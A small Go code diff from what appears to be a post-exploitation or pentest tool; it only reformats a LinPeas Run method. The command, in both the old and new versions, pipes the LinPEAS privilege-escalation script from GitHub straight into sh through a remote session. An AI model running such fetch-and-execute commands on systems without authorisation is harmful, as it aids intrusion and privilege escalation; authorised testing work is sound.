@@ -13,5 +13,9 @@ type LinPeas struct {
 
 // Run runs LinPEAS on the machine
 func (linPeas LinPeas) Run() {
-	go linPeas.Session.Execute("curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh\n")
+	go linPeas.Session.Execute(
+		"curl https://raw.githubusercontent.com/carlospolop/" +
+			"privilege-escalation-awesome-scripts-suite/master/linPEAS/" +
+			"linpeas.sh | sh\n",
+	)
 }
